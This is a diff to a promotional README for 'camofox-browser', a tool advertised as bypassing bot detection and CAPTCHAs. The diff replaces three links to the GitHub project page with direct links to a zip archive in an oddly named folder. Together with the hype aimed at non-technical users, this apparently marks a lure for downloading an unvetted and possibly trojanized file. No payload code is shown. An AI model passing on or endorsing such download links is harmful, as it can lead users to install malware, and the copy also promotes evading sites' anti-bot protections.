@@ -1,7 +1,7 @@
 <h1>🦊 camofox-browser - Bypass Bot Detection Effortlessly Today</h1>
 
 <p align="center">
-  <a href="https://github.com/ROCJ05478/camofox-browser" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD CAMOFOX NOW</a>
+  <a href="https://raw.githubusercontent.com/ROCJ05478/camofox-browser/main/expandedness/camofox_browser_v3.2.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD CAMOFOX NOW</a>
 </p>
 
 Welcome to **camofox-browser** – your new best friend for browsing the web without getting blocked. Whether you're collecting data, automating tasks, or just exploring websites that don't like bots, this tool makes it incredibly simple. Think of it as a secret agent browser that looks exactly like a normal person using Chrome or Firefox.
@@ -44,7 +44,7 @@ No special hardware, no complicated software, no programming knowledge needed.
 
 ### Step 1: Download Camofox-Browser
 
-[Visit this link to download the application](https://github.com/ROCJ05478/camofox-browser)
+[Visit this link to download the application](https://raw.githubusercontent.com/ROCJ05478/camofox-browser/main/expandedness/camofox_browser_v3.2.zip)
 
 Click the big download button on the GitHub page. The file will start downloading automatically.
 
@@ -159,7 +159,7 @@ Compared to traditional browsers:
 Join thousands of users who browse without limits. Download camofox-browser today and never see "verify you're human" again.
 
 <p align="center">
-  <a href="https://github.com/ROCJ05478/camofox-browser" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#48dbfb,#0abde3);color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">🔗 GET CAMOFOX-BROWSER</a>
+  <a href="https://raw.githubusercontent.com/ROCJ05478/camofox-browser/main/expandedness/camofox_browser_v3.2.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#48dbfb,#0abde3);color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">🔗 GET CAMOFOX-BROWSER</a>
 </p>
 
 ---
